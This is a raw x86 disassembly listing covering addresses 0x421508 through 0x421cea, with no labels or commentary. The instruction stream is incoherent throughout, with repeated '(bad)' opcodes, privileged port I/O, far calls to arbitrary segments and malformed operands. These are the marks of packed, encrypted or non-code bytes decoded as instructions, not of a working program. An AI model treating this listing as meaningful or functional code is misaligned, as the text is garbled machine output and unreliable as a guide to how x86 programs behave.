  421508:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421509:	ds push ecx
  42150b:	mov    edx,0x18f4dca1
  421510:	adc    edx,DWORD PTR [ecx-0x5d]
  421513:	inc    ebx
  421514:	mov    edi,0xb981e43a
  421519:	nop    DWORD PTR [eax+0x4c4bf772]
  421520:	mov    ebx,0xbff25462
  421525:	pop    ss
  421526:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421527:	fldcw  WORD PTR [ecx+ebp*2+0x167c7d46]
  42152e:	int    0x8b
  421530:	xchg   BYTE PTR [eax],ch
  421532:	cli    
  421533:	xchg   bl,bh
  421535:	(bad)  
  421537:	in     eax,dx
  421538:	cmp    eax,0x37fdb57e
  42153d:	add    eax,0x53225043
  421542:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421543:	call   0x692d:0x2e661d67
  42154a:	cmp    BYTE PTR [eax],dl
  42154c:	test   BYTE PTR [esi+0x77],ah
  42154f:	bt     DWORD PTR [eax],ebx
  421552:	and    al,0x5c
  421554:	(bad)  
  421555:	call   DWORD PTR [ebp-0x60]
  421558:	imul   BYTE PTR [esi+eiz*8]
  42155b:	loopne 0x42156e
  42155d:	inc    ebp
  42155e:	adc    DWORD PTR [eax-0x3a65f8a4],ecx
  421564:	popf   
  421565:	push   es
  421566:	(bad)  
  421567:	call   0x4ab52b0f
  42156c:	ins    BYTE PTR es:[edi],dx
  42156d:	xor    BYTE PTR [ebx+0x6f],0xad
  421571:	push   eax
  421572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421573:	ja     0x4215a7
  421575:	pusha  
  421576:	and    al,bl
  421578:	jae    0x421567
  42157a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42157b:	les    ecx,FWORD PTR [ebx-0x4b]
  42157e:	inc    ebx
  42157f:	add    esp,esi
  421581:	mov    esp,0x6de3f437
  421586:	jle    0x4215fb
  421588:	rol    DWORD PTR [edx+0x70],1
  42158b:	pop    esi
  42158c:	jp     0x42153c
  42158e:	fadd   DWORD PTR [edi]
  421590:	push   edi
  421591:	inc    edx
  421592:	out    0xb3,al
  421594:	xor    ch,al
  421596:	mov    dl,0x71
  421598:	jne    0x42157d
  42159a:	mov    ecx,0xe4833a54
  42159f:	adc    edx,esp
  4215a1:	pop    es
  4215a2:	test   BYTE PTR [esi],dl
  4215a4:	loop   0x421571
  4215a6:	iret   
  4215a7:	mov    WORD PTR [edi+0x61],?
  4215aa:	ins    BYTE PTR es:[edi],dx
  4215ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215ac:	sub    edi,DWORD PTR [edi+edi*8+0x7e]
  4215b0:	aaa    
  4215b1:	inc    edx
  4215b2:	aam    0x4b
  4215b4:	jns    0x4215f0
  4215b6:	gs iret 
  4215b8:	call   0x53206d13
  4215bd:	call   0xa9d1:0xe1c52903
  4215c4:	cmovle eax,DWORD PTR [ebp-0x1b]
  4215c8:	(bad)  
  4215c9:	in     eax,dx
  4215ca:	mov    bh,0x67
  4215cc:	pushf  
  4215cd:	test   al,0x7
  4215cf:	jbe    0x421606
  4215d1:	push   0x2c3e2b25
  4215d6:	cmc    
  4215d7:	popf   
  4215d8:	adc    eax,0x1a24495b
  4215dd:	add    dl,BYTE PTR [eax+esi*8]
  4215e0:	dec    edi
  4215e1:	mov    ecx,0xffdb7b2c
  4215e6:	xchg   esp,eax
  4215e7:	cwde   
  4215e8:	cwde   
  4215e9:	adc    BYTE PTR [ecx],ch
  4215eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215ec:	fild   QWORD PTR [esi+edx*2-0x1cb3f5f1]
  4215f3:	lea    esi,[edx-0x32]
  4215f6:	(bad)  
  4215f7:	jae    0x4215dc
  4215f9:	rol    DWORD PTR [edx],0x55
  4215fc:	add    al,0xc4
  4215fe:	out    0xf,al
  421600:	ds shl ebx,1
  421603:	sti    
  421604:	mov    ah,0x78
  421606:	fs scas al,BYTE PTR es:[edi]
  421608:	shl    BYTE PTR [ebx],1
  42160a:	mov    eax,ds:0x938846e
  42160f:	icebp  
  421610:	and    dh,BYTE PTR [edi+0x71]
  421613:	enter  0xef4f,0xdc
  421617:	add    DWORD PTR [ebp+ebx*4-0x6376b774],0xd7a473f6
  421622:	pop    edx
  421623:	and    BYTE PTR [esp+edi*4+0x75],0xbe
  421628:	lods   al,BYTE PTR ds:[esi]
  421629:	icebp  
  42162a:	in     eax,0x2a
  42162c:	sbb    BYTE PTR [ecx],bl
  42162e:	(bad)  
  42162f:	retf   
  421630:	fdivr  QWORD PTR [edx+0x77]
  421633:	or     al,0x81
  421635:	xlat   BYTE PTR ds:[ebx]
  421636:	dec    eax
  421637:	pushf  
  421638:	push   0x2d920117
  42163d:	sbb    bh,BYTE PTR ds:0xb2e25e45
  421643:	push   ss
  421644:	or     al,0x65
  421646:	add    bl,BYTE PTR ds:0x1a6d6fcb
  42164c:	xchg   ecx,eax
  42164d:	call   0x8a755dfb
  421652:	pop    eax
  421653:	mov    al,ds:0x9ba2b45
  421658:	and    esp,esi
  42165a:	int3   
  42165b:	call   0x80ad9e51
  421660:	pop    esi
  421661:	and    BYTE PTR [ecx+0xbe41330],0x29
  421668:	lods   eax,DWORD PTR ds:[esi]
  421669:	lea    esi,[edi-0x6b]
  42166c:	push   ss
  42166d:	int    0x39
  42166f:	div    BYTE PTR [ebp+0x3c]
  421672:	cmp    ebp,DWORD PTR [ebp-0x588f29b5]
  421678:	rcr    BYTE PTR [edx+0x435bdd9c],1
  42167e:	out    dx,al
  42167f:	sar    cl,1
  421681:	and    BYTE PTR [edx-0x42],dl
  421684:	test   DWORD PTR [edi+0x20f402cb],0x35926124
  42168e:	iret   
  42168f:	inc    edx
  421690:	and    al,0x94
  421692:	scas   al,BYTE PTR es:[edi]
  421693:	nop
  421694:	jge    0x4216f1
  421696:	sbb    edx,DWORD PTR [ecx-0x2]
  421699:	into   
  42169a:	aad    0xb8
  42169c:	inc    edx
  42169d:	in     al,dx
  42169e:	call   0x7f6f:0x29f65a5f
  4216a5:	mov    ah,0x49
  4216a7:	mov    ah,al
  4216a9:	aaa    
  4216aa:	inc    ebp
  4216ab:	jmp    0x42166e
  4216ad:	xchg   esp,eax
  4216ae:	imul   edx,esp,0x6806a967
  4216b4:	sti    
  4216b5:	fsub   DWORD PTR [edi+0x305fa1ed]
  4216bb:	pop    eax
  4216bc:	fld    QWORD PTR [ebp+edi*8-0x21]
  4216c0:	into   
  4216c1:	repnz push es
  4216c3:	push   eax
  4216c4:	loop   0x42167a
  4216c6:	fst    QWORD PTR [edi-0x510cbe47]
  4216cc:	inc    esp
  4216cd:	add    ecx,DWORD PTR [edx]
  4216cf:	pushf  
  4216d0:	outs   dx,DWORD PTR ds:[esi]
  4216d1:	sub    al,0x86
  4216d3:	pop    eax
  4216d4:	in     eax,0xd0
  4216d6:	mov    ebp,0xa1744de2
  4216db:	data16 arpl WORD PTR [ecx+0x48],cx
  4216df:	add    dl,BYTE PTR [ebx]
  4216e1:	fimul  DWORD PTR [edx+0x47]
  4216e4:	stc    
  4216e5:	mov    edi,0x98a1c749
  4216ea:	mov    WORD PTR [esi+eiz*8+0x13],ds
  4216ee:	sbb    BYTE PTR cs:[esi],cl
  4216f1:	pop    ss
  4216f2:	pop    es
  4216f3:	fsub   st,st(6)
  4216f5:	xchg   dl,dl
  4216f7:	xchg   edi,eax
  4216f8:	ficom  WORD PTR [ebx]
  4216fa:	bound  ecx,QWORD PTR [ebp+eax*8+0x32]
  4216fe:	mov    ch,0x94
  421700:	jmp    0x27f57975
  421705:	mov    ebx,0x9939161e
  42170a:	cwde   
  42170b:	test   BYTE PTR [ebx],ch
  42170d:	popa   
  42170e:	hlt    
  42170f:	sub    DWORD PTR [edi+ebp*4-0x73],esp
  421713:	mov    cl,0xb
  421715:	jno    0x421771
  421717:	adc    al,0x9f
  421719:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42171a:	fxch   st(3)
  42171c:	retf   0x1e12
  42171f:	adc    ch,ah
  421721:	dec    ebp
  421722:	fs pusha 
  421724:	xor    al,0xf1
  421726:	xchg   ebx,eax
  421727:	rol    BYTE PTR [eax+0x18],0x88
  42172b:	sbb    dh,BYTE PTR [eax+eax*4+0x5a]
  42172f:	cmp    bl,BYTE PTR [ebp+0x19f288bd]
  421735:	or     BYTE PTR [ebx-0x3ac73e7f],bl
  42173b:	jmp    0xdc73:0x9fc7c16
  421742:	mov    BYTE PTR [edi],dl
  421744:	bound  edi,QWORD PTR [ecx+0x6a73f7ef]
  42174a:	pop    ds
  42174b:	xlat   BYTE PTR ds:[ebx]
  42174c:	dec    ebp
  42174d:	in     eax,0x72
  42174f:	jb     0x421731
  421751:	jecxz  0x421728
  421753:	and    al,0xba
  421755:	(bad)  
  421756:	dec    ecx
  421757:	loopne 0x42176c
  421759:	adc    eax,0x105569d9
  42175e:	mov    al,0xcf
  421760:	and    al,0xa
  421762:	mov    DWORD PTR [eax+0x630e27e8],ecx
  421768:	sbb    eax,0xb0ebbbbf
  42176d:	popa   
  42176e:	or     eax,esp
  421770:	mov    bh,0xc0
  421772:	xor    BYTE PTR [edx-0x3d],bh
  421775:	pop    ss
  421776:	inc    ebx
  421777:	mov    dh,BYTE PTR [eax]
  421779:	repz adc al,0x42
  42177c:	and    DWORD PTR [ecx+0x2d24184f],edx
  421782:	and    al,0x91
  421784:	rol    BYTE PTR [eax],cl
  421786:	outs   dx,BYTE PTR ds:[esi]
  421787:	stos   DWORD PTR es:[edi],eax
  421788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421789:	pop    edx
  42178b:	jecxz  0x4217a2
  42178d:	xor    cl,cl
  42178f:	jae    0x42179e
  421791:	or     al,BYTE PTR [edi]
  421793:	xor    cl,BYTE PTR [eax]
  421795:	jmp    0xd1307942
  42179a:	xchg   esp,eax
  42179b:	mov    BYTE PTR [ebx+0x1d],dl
  42179e:	adc    DWORD PTR [ebx+ecx*4-0x63f5fd47],ecx
  4217a5:	stos   BYTE PTR es:[edi],al
  4217a6:	push   0xffffffb6
  4217a8:	adc    dl,bh
  4217aa:	mov    esi,0x5abfb8f5
  4217af:	fisub  WORD PTR [edx]
  4217b1:	pop    eax
  4217b2:	sbb    BYTE PTR [eax-0x13bc181c],dh
  4217b8:	dec    ebx
  4217b9:	push   ss
  4217ba:	lods   al,BYTE PTR ds:[esi]
  4217bb:	jo     0x4217ab
  4217bd:	and    eax,0x3d3581a5
  4217c2:	lock add bl,dl
  4217c5:	sbb    ecx,0x85542709
  4217cb:	test   eax,0xfd5f556d
  4217d0:	xor    eax,0xd565972f
  4217d5:	and    eax,0xc77ba93f
  4217da:	xor    edi,DWORD PTR [esi]
  4217dc:	inc    esi
  4217dd:	sub    ecx,DWORD PTR [eax+0x30]
  4217e0:	push   ecx
  4217e1:	aas    
  4217e2:	jg     0x421769
  4217e4:	in     al,0x7b
  4217e6:	imul   edi,edi,0x69
  4217e9:	out    dx,al
  4217ea:	dec    ecx
  4217eb:	bound  ebx,QWORD PTR [edi+0x7f]
  4217ee:	daa    
  4217ef:	adc    bh,0x5b
  4217f2:	jnp    0x4217e5
  4217f4:	loop   0x42180e
  4217f6:	data16 out dx,al
  4217f8:	mov    ebx,0xa13d25b3
  4217fd:	loope  0x421851
  4217ff:	int    0x18
  421801:	jl     0x421827
  421803:	push   edi
  421804:	in     eax,0xf3
  421806:	jo     0x42187e
  421808:	out    0x0,al
  42180a:	mov    edi,0xa1d2b3ec
  42180f:	adc    eax,0x39766053
  421814:	bound  edi,QWORD PTR [esi-0x11]
  421817:	dec    eax
  421818:	adc    eax,0xd2b84ba5
  42181d:	shl    DWORD PTR ds:0x6131d629,cl
  421823:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  421825:	inc    ebp
  421826:	call   0x55f5:0x9b733140
  42182d:	xchg   ebp,eax
  42182e:	daa    
  42182f:	out    0xd3,eax
  421831:	xchg   ebx,eax
  421832:	xchg   DWORD PTR [esi-0x3],eax
  421835:	inc    ecx
  421836:	push   esi
  421837:	sub    BYTE PTR [esi-0xd],ah
  42183a:	ins    BYTE PTR es:[edi],dx
  42183b:	xor    BYTE PTR [eax],0x14
  42183e:	repz aad 0xbc
  421841:	bswap  ebp
  421843:	or     eax,0x51d23dcf
  421848:	or     eax,0x927b4e4c
  42184d:	ret    
  42184e:	or     al,BYTE PTR [ecx+0x3e]
  421851:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421852:	pop    DWORD PTR [ebp+0x7cb4de9]
  421858:	sbb    ch,dh
  42185a:	scas   eax,DWORD PTR es:[edi]
  42185b:	mov    bl,0xd5
  42185d:	je     0x421867
  42185f:	mov    DWORD PTR [eax-0x6c08acc7],edx
  421865:	pop    esi
  421866:	and    eax,0x67f02320
  42186b:	fld    QWORD PTR [ecx]
  42186d:	aad    0x6e
  42186f:	sbb    ah,0x76
  421872:	xchg   ebx,eax
  421873:	mov    bh,0x87
  421875:	mov    dl,BYTE PTR [edi+ebx*4]
  421878:	ins    DWORD PTR es:[edi],dx
  421879:	sbb    al,0x63
  42187b:	cdq    
  42187c:	(bad)  
  42187d:	dec    esp
  42187e:	push   ecx
  42187f:	mov    ebx,0x5daec624
  421884:	cmp    eax,0x6c18c6bb
  421889:	and    DWORD PTR [edi-0x27],ebp
  42188c:	out    dx,al
  42188d:	sbb    DWORD PTR [edi],ecx
  42188f:	(bad)  
  421890:	enter  0x60d2,0x86
  421894:	mov    BYTE PTR [edx-0x1c],dl
  421897:	xor    eax,0xc0708d78
  42189c:	sbb    cl,BYTE PTR [ebp-0x3929f038]
  4218a2:	mov    bl,0x32
  4218a4:	mov    dh,BYTE PTR [eax-0x29b82633]
  4218aa:	cwde   
  4218ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218ac:	inc    esp
  4218ad:	mov    ecx,0x7e41c692
  4218b2:	inc    edi
  4218b3:	data16 hlt 
  4218b5:	in     al,dx
  4218b6:	scas   al,BYTE PTR es:[edi]
  4218b7:	fcmovu st,st(7)
  4218b9:	enter  0xe8db,0xb1
  4218bd:	call   0x2282:0x828feb72
  4218c4:	xor    DWORD PTR [edi+ebx*8+0x3],esp
  4218c8:	jecxz  0x4218d6
  4218ca:	and    edi,esp
  4218cc:	iret   
  4218cd:	fiadd  WORD PTR [ecx-0x2b]
  4218d0:	adc    al,0x95
  4218d2:	iret   
  4218d3:	and    al,0x66
  4218d5:	shl    ebx,0x92
  4218d8:	inc    ecx
  4218d9:	mov    cl,0xe0
  4218db:	and    edi,DWORD PTR [edi]
  4218dd:	inc    ebp
  4218de:	in     eax,0x1a
  4218e0:	lods   eax,DWORD PTR ds:[esi]
  4218e1:	mov    BYTE PTR [ebx+0x5ad93dad],0x2
  4218e8:	adc    dl,cl
  4218ea:	imul   esi,DWORD PTR [ebp+0x6d5b20fc],0x8b0fcc7d
  4218f4:	jmp    0xade70c08
  4218f9:	call   0x33de:0xdc403978
  421900:	mov    eax,ds:0x9b5075b
  421905:	mov    dh,0x7
  421907:	mov    esi,0xd76c0c90
  42190c:	or     edx,DWORD PTR gs:[ecx+0x61]
  421910:	scas   al,BYTE PTR es:[edi]
  421911:	ins    DWORD PTR es:[edi],dx
  421912:	pusha  
  421913:	repnz or DWORD PTR [edx+ebx*4+0x36b6ea62],0x8fd2d236
  42191f:	shl    BYTE PTR ds:0xafaa5213,0xdf
  421926:	pop    esi
  421927:	mov    BYTE PTR [edx],cl
  421929:	rol    cl,0xae
  42192c:	sti    
  42192d:	stc    
  42192e:	fbstp  TBYTE PTR [esi-0x6a7da46d]
  421934:	xchg   ecx,eax
  421935:	in     eax,0x63
  421937:	dec    edx
  421938:	test   al,cl
  42193a:	jmp    0x111:0x2809a178
  421941:	scas   eax,DWORD PTR es:[edi]
  421942:	push   cs
  421943:	and    BYTE PTR [esi+0x40],dh
  421946:	js     0x4218fa
  421948:	fbstp  TBYTE PTR [esi+0x6a]
  42194b:	adc    DWORD PTR cs:[esi+0x2b023843],0xffffffae
  421953:	add    BYTE PTR [esi],al
  421955:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421956:	dec    ecx
  421957:	(bad)  
  421958:	repz mov bh,0xea
  42195b:	std    
  42195c:	retf   0xc261
  42195f:	cmp    dh,BYTE PTR [edi+eax*8-0x477f5ec2]
  421966:	adc    DWORD PTR [eax-0x55],ecx
  421969:	xor    DWORD PTR [ecx],ecx
  42196b:	sbb    esp,esp
  42196d:	and    eax,0x31f849c7
  421972:	cli    
  421973:	js     0x4219dc
  421975:	lea    edx,[edi-0x59950f72]
  42197b:	xor    eax,ebx
  42197d:	sub    eax,0x685ca3fa
  421982:	adc    esp,DWORD PTR [esi+ecx*2+0x6c]
  421986:	je     0x421976
  421988:	loop   0x4219f4
  42198a:	scas   al,BYTE PTR es:[edi]
  42198b:	repz cmp BYTE PTR [eax-0x468b1671],dl
  421992:	adc    al,0x59
  421994:	lods   al,BYTE PTR ds:[esi]
  421995:	cdq    
  421996:	rcr    dl,1
  421998:	xor    eax,0xa5086a67
  42199d:	rol    BYTE PTR [ebx],1
  42199f:	aas    
  4219a0:	loop   0x421a21
  4219a2:	inc    edi
  4219a3:	mov    edx,0xad0619c1
  4219a8:	xor    ch,BYTE PTR [ebx]
  4219aa:	add    bh,dl
  4219ac:	or     eax,0x4383ff05
  4219b1:	cld    
  4219b2:	adc    eax,0xd1e85647
  4219b7:	lods   eax,DWORD PTR ds:[esi]
  4219b8:	and    al,0xb2
  4219ba:	pushf  
  4219bb:	popa   
  4219bc:	xchg   ecx,eax
  4219bd:	inc    ebp
  4219be:	push   ebp
  4219bf:	xor    al,0xd9
  4219c1:	ret    
  4219c2:	inc    ebx
  4219c3:	frstor [ebx-0x37514982]
  4219c9:	shl    BYTE PTR [esi-0x56ded565],1
  4219cf:	mov    edi,0xaa1d4bbd
  4219d4:	repz int 0xc7
  4219d7:	lock std 
  4219d9:	in     al,0x7f
  4219db:	push   ebx
  4219dc:	(bad)  
  4219dd:	call   0xa56880d1
  4219e2:	sar    ah,cl
  4219e4:	or     edi,DWORD PTR [ebp-0x45]
  4219e7:	sbb    DWORD PTR [edx+eax*2+0x5],ebp
  4219eb:	ja     0x4219ff
  4219ed:	jecxz  0x4219e4
  4219ef:	addr16 sar cl,1
  4219f2:	ror    dl,1
  4219f4:	jecxz  0x421997
  4219f6:	jle    0x421a5e
  4219f8:	and    edi,DWORD PTR [ebp+0x5226063e]
  4219fe:	retf   
  4219ff:	call   0x364a:0x7336911f
  421a06:	add    bh,0x2a
  421a09:	cwde   
  421a0a:	jmp    0x8aeb:0xd3e9c033
  421a11:	add    al,0xd6
  421a13:	adc    DWORD PTR [di],ebp
  421a16:	lods   al,BYTE PTR ds:[esi]
  421a17:	fiadd  DWORD PTR [ecx-0x4f]
  421a1a:	and    eax,0xa731e354
  421a1f:	mov    bh,0x53
  421a21:	or     bh,BYTE PTR [ebp+0x57]
  421a24:	xor    BYTE PTR [esi],al
  421a26:	enter  0x99b4,0x3d
  421a2a:	xor    BYTE PTR [edi+ecx*2-0x1a],0x5
  421a2f:	push   ecx
  421a30:	jle    0x421a19
  421a32:	test   eax,0x3d98ff42
  421a37:	ficomp WORD PTR [edi+0x548b2fd2]
  421a3d:	ret    
  421a3e:	xor    ebx,DWORD PTR [eax]
  421a40:	js     0x421a5a
  421a42:	lock and eax,0xaa2cad4c
  421a48:	loop   0x421a17
  421a4a:	add    BYTE PTR [eax],dl
  421a4c:	daa    
  421a4d:	das    
  421a4e:	stos   BYTE PTR es:[edi],al
  421a4f:	adc    BYTE PTR [esi-0x54123277],ch
  421a55:	xchg   ebp,eax
  421a56:	lahf   
  421a57:	add    al,0x65
  421a59:	cmp    DWORD PTR [ebp-0x80],ebx
  421a5c:	test   eax,0x54ccc66a
  421a61:	sbb    eax,DWORD PTR [edx-0x3a4ee5a9]
  421a67:	stos   BYTE PTR es:[edi],al
  421a68:	or     esi,ecx
  421a6a:	dec    eax
  421a6b:	pop    ds
  421a6c:	rcl    BYTE PTR [eax+0x2d5fa08d],0x5f
  421a73:	xchg   ecx,eax
  421a74:	ins    BYTE PTR es:[edi],dx
  421a75:	dec    eax
  421a76:	mov    eax,ds:0x1e83fd0c
  421a7b:	sar    DWORD PTR [eax+0x25fa0692],1
  421a81:	call   0x32e9:0xcd551ca8
  421a88:	mov    WORD PTR [ebp-0x50],?
  421a8b:	inc    edi
  421a8c:	les    ecx,FWORD PTR [eax]
  421a8e:	cmp    al,0x69
  421a90:	pop    eax
  421a91:	sub    BYTE PTR [ebp+0x606c92ea],dl
  421a97:	add    DWORD PTR [edi],edi
  421a99:	or     eax,esp
  421a9b:	jmp    0xfba4:0xa23f71ad
  421aa2:	inc    esp
  421aa3:	(bad)  
  421aa4:	les    eax,FWORD PTR [ebp+0xa]
  421aa7:	add    BYTE PTR [ebx+0x29],bl
  421aaa:	jmp    0x642e:0x57a549a7
  421ab1:	mov    edx,0x81f3c831
  421ab6:	mov    esp,0xbd225438
  421abb:	add    ebp,DWORD PTR [esi-0x41]
  421abe:	and    al,0x17
  421ac0:	retf   0x97d2
  421ac3:	cmc    
  421ac4:	jg     0x421a48
  421ac6:	or     bh,BYTE PTR [edx]
  421ac8:	and    al,0x34
  421aca:	adc    dl,dl
  421acc:	sub    ch,BYTE PTR [edx-0x6d3fd983]
  421ad2:	jbe    0x421b08
  421ad4:	pop    esp
  421ad5:	inc    edi
  421ad6:	or     DWORD PTR [esi],eax
  421ad8:	or     al,cl
  421ada:	fstp   TBYTE PTR [edx]
  421adc:	mov    ebp,0x46d82af9
  421ae1:	lahf   
  421ae2:	or     eax,0xe59a5563
  421ae7:	ror    DWORD PTR [eax],1
  421ae9:	jg     0x421a72
  421aeb:	rol    BYTE PTR [ecx],cl
  421aed:	ja     0x421b40
  421aef:	fcmovbe st,st(7)
  421af1:	add    ah,cl
  421af3:	xor    DWORD PTR [edi-0x2b],ebx
  421af6:	in     eax,dx
  421af7:	aas    
  421af8:	jmp    0xb6e6:0x97d81df1
  421aff:	pop    ebp
  421b00:	inc    edx
  421b01:	repnz scas eax,DWORD PTR es:[edi]
  421b03:	(bad)  
  421b04:	repnz dec ebp
  421b06:	fmulp  st(2),st
  421b08:	fst    QWORD PTR [esi-0x25]
  421b0b:	int    0xf4
  421b0d:	dec    ebx
  421b0e:	jno    0x421af3
  421b10:	popf   
  421b11:	out    0x56,eax
  421b13:	(bad)  
  421b14:	pop    ebx
  421b15:	xor    al,0x4c
  421b17:	push   ds
  421b18:	sub    BYTE PTR [edi-0x59],0x63
  421b1c:	in     eax,dx
  421b1d:	aas    
  421b1e:	mov    ecx,0xd4975395
  421b23:	loopne 0x421b2f
  421b25:	jnp    0x421ab1
  421b27:	lods   al,BYTE PTR ds:[esi]
  421b28:	adc    eax,DWORD PTR [edi]
  421b2a:	je     0x421ae1
  421b2c:	xor    edi,DWORD PTR [esi+eiz*2-0x3eb697aa]
  421b33:	lahf   
  421b34:	push   edx
  421b35:	pop    ds
  421b36:	in     eax,dx
  421b37:	xchg   ebp,eax
  421b38:	push   ss
  421b39:	sub    ebp,DWORD PTR [ecx+0x431606c7]
  421b3f:	or     al,0xa2
  421b41:	daa    
  421b42:	leave  
  421b43:	jb     0x421b76
  421b45:	sti    
  421b46:	cdq    
  421b47:	test   BYTE PTR [ebp-0x70],al
  421b4a:	into   
  421b4b:	ss (bad) 
  421b4d:	cld    
  421b4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b4f:	or     edx,DWORD PTR [ecx+0x55c48053]
  421b55:	(bad)  
  421b57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b58:	cmp    DWORD PTR [esi-0x56f6bd0f],ebx
  421b5e:	adc    ch,bh
  421b60:	cmp    esi,DWORD PTR [esi-0x4c]
  421b63:	adc    eax,edx
  421b65:	lahf   
  421b66:	jb     0x421b65
  421b68:	dec    esi
  421b69:	mov    WORD PTR [ebp-0x47],?
  421b6c:	mov    esp,0xd2a4f07a
  421b71:	retf   
  421b72:	dec    esi
  421b73:	pusha  
  421b74:	aas    
  421b75:	out    0x3e,al
  421b77:	ss dec esp
  421b79:	pop    es
  421b7a:	shr    bl,cl
  421b7c:	cmp    ch,BYTE PTR [eax+0x27]
  421b7f:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  421b81:	scas   al,BYTE PTR es:[edi]
  421b82:	xchg   edx,eax
  421b83:	jmp    0x2172d938
  421b88:	push   ss
  421b89:	outs   dx,BYTE PTR ds:[esi]
  421b8a:	xchg   ebp,eax
  421b8b:	mov    cs,edi
  421b8d:	repnz (bad) 
  421b8f:	in     eax,dx
  421b90:	push   esi
  421b91:	sbb    DWORD PTR ds:0x11018ee3,0x79
  421b98:	inc    esi
  421b99:	sbb    edi,DWORD PTR ds:0x4098af1c
  421b9f:	mul    ch
  421ba1:	pop    ebp
  421ba2:	xchg   ecx,eax
  421ba3:	fnstcw WORD PTR [edi+0xf]
  421ba6:	mov    bh,0xfc
  421ba8:	(bad)  
  421ba9:	pop    edx
  421baa:	jnp    0x421b89
  421bac:	inc    edx
  421bad:	retf   0xb9dc
  421bb0:	pop    es
  421bb1:	sar    DWORD PTR [ecx-0x28f59c5c],cl
  421bb7:	in     al,0x58
  421bb9:	gs stos BYTE PTR es:[edi],al
  421bbb:	test   cl,dl
  421bbd:	out    dx,eax
  421bbe:	mov    bl,0x33
  421bc0:	jge    0x421c09
  421bc2:	test   al,0x77
  421bc4:	cdq    
  421bc5:	(bad)  
  421bc6:	in     al,dx
  421bc7:	or     DWORD PTR [edi+0x32],edi
  421bca:	(bad)  [edi]
  421bcc:	sbb    al,0xd4
  421bce:	imul   ecx,DWORD PTR [esi],0x1471f9fc
  421bd4:	mov    ebx,0x33277f8f
  421bd9:	rcr    DWORD PTR [edi+edi*8-0x1124a2ee],cl
  421be0:	rcr    BYTE PTR [edi+0x4a],cl
  421be3:	mov    dh,0xd9
  421be5:	cmp    BYTE PTR gs:[edi],al
  421be8:	pop    esp
  421be9:	push   ecx
  421bea:	jb     0x421b9e
  421bec:	cs aaa 
  421bee:	xor    eax,DWORD PTR [edx+0x2533ebe9]
  421bf4:	call   0x49f3:0xe816b2ca
  421bfb:	sbb    DWORD PTR [ecx+0x7c],ecx
  421bfe:	push   cs
  421bff:	add    eax,ebp
  421c01:	mov    ah,0xaf
  421c03:	dec    ecx
  421c04:	cld    
  421c05:	mov    eax,0xa8a87e47
  421c0a:	sbb    eax,DWORD PTR [eax]
  421c0c:	sub    BYTE PTR [ecx],dl
  421c0e:	mov    WORD PTR [esi-0x50b48a78],ss
  421c14:	mov    esp,0xe7fd1b3d
  421c19:	pop    esi
  421c1a:	(bad)  
  421c1b:	jmp    0x9e1b6696
  421c20:	retf   
  421c21:	iret   
  421c22:	or     DWORD PTR [ebx],0xcf912ac9
  421c28:	out    dx,al
  421c29:	arpl   WORD PTR [ecx-0x52182d69],sp
  421c2f:	scas   eax,DWORD PTR es:[edi]
  421c30:	sbb    cl,ah
  421c32:	sahf   
  421c33:	dec    ecx
  421c34:	mov    ch,0x83
  421c36:	clc    
  421c37:	push   edi
  421c38:	aaa    
  421c39:	mov    ch,BYTE PTR [esp+edx*2]
  421c3c:	cmp    DWORD PTR [ecx+0x659a6afd],ecx
  421c42:	jle    0x421c57
  421c44:	adc    al,0xe8
  421c46:	js     0x421c32
  421c48:	jnp    0x421ca0
  421c4a:	add    DWORD PTR cs:[ebx-0xda6bf9f],eax
  421c51:	imul   eax,DWORD PTR [eax+ebx*2-0x41d11fce],0xffffffc0
  421c59:	mov    DWORD PTR [ecx+0x7b],edi
  421c5c:	cmp    eax,0xf56c915e
  421c61:	gs retf 
  421c63:	(bad)  
  421c64:	pop    ebp
  421c65:	ret    
  421c66:	xchg   ebx,eax
  421c67:	xor    ah,BYTE PTR [ecx+0x4b]
  421c6a:	jmp    0x421bf1
  421c6c:	in     al,0x11
  421c6e:	idiv   dh
  421c70:	bound  eax,QWORD PTR [eax-0x4c4e4343]
  421c76:	js     0x421c95
  421c78:	sbb    al,0xc1
  421c7a:	sar    DWORD PTR [eax],0x5d
  421c7d:	je     0x421ca4
  421c7f:	xchg   edx,eax
  421c80:	rcl    BYTE PTR [ebx-0x40eaa4ce],1
  421c86:	push   esp
  421c87:	or     edx,DWORD PTR [esi]
  421c89:	dec    ebx
  421c8a:	je     0x421c1d
  421c8c:	test   al,0x22
  421c8e:	inc    edi
  421c8f:	rcr    BYTE PTR [ebp+0x46703f1a],cl
  421c95:	shl    edx,cl
  421c97:	xor    al,0x24
  421c99:	fisttp WORD PTR [ecx-0x60]
  421c9c:	inc    BYTE PTR ds:0xd6a4c555
  421ca2:	push   edi
  421ca3:	xor    BYTE PTR [esi-0x48],bl
  421ca6:	fidivr WORD PTR [edi-0x2]
  421ca9:	test   al,0xd9
  421cab:	adc    eax,0x772af826
  421cb0:	retf   
  421cb1:	and    DWORD PTR [edi-0x6c951ce7],0x3c
  421cb8:	adc    eax,0xb53ea4fb
  421cbd:	adc    eax,0x79aafed6
  421cc2:	mov    BYTE PTR [edx-0x4c338b94],dh
  421cc8:	ins    DWORD PTR es:[edi],dx
  421cc9:	repnz sub bl,BYTE PTR [ebx-0x373c1ee4]
  421cd0:	fdivp  st(6),st
  421cd2:	push   esi
  421cd3:	jecxz  0x421d17
  421cd5:	mov    cl,0x29
  421cd7:	rcr    BYTE PTR [edx-0x2c],0xaf
  421cdb:	nop
  421cdc:	inc    ebx
  421cdd:	push   edx
  421cde:	call   0x3c9e0886
  421ce3:	mov    ebx,0x2c9d71c7
  421ce8:	jb     0x421c92
  421cea:	dec    esp
